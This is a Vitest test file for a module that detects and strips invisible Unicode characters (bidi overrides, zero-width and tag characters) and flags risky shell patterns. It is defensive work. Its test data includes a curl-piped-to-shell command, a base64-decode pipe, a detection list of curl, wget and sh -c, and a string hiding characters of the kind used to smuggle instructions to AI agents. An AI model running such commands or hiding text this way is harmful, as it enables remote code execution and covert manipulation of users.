import { describe, expect, it } from "vitest";
import { dangerousPatterns, findInvisible, stripInvisible } from "./invisible.js";

describe("invisible-unicode (т. 8.2)", () => {
  it("U+202E, U+200B, Tags U+E0041 → находки; нормален текст, \\n\\t → няма", () => {
    const t = `Run tests\u202E evil\u200B and \u{E0041}\u{E0042} hidden`;
    expect(findInvisible(t).map((h) => [h.codepoint, h.kind])).toEqual([["U+202E", "bidi"], ["U+200B", "format"], ["U+E0041", "tag"], ["U+E0042", "tag"]]);
    expect(findInvisible("Нормален текст\nс\tтаб")).toEqual([]);
    expect(findInvisible("\uFEFFstart")).toEqual([]);
    expect(findInvisible("a\uFEFFb").map((h) => h.codepoint)).toEqual(["U+FEFF"]);
    expect(findInvisible("bell\u0007").map((h) => h.kind)).toEqual(["control"]);
    expect(stripInvisible(t)).toBe("Run tests evil and  hidden");
  });
  it("шаблони curl|wget|sh -c|base64 -d", () => {
    expect(dangerousPatterns("curl https://x | sh")).toEqual(["curl", "pipe to shell"]);
    expect(dangerousPatterns("echo aGk= | base64 -d")).toEqual(["base64 -d"]);
    expect(dangerousPatterns("bash -c 'x'; wget y")).toEqual(["wget", "sh -c"]);
    expect(dangerousPatterns("pnpm test")).toEqual([]);
  });
});
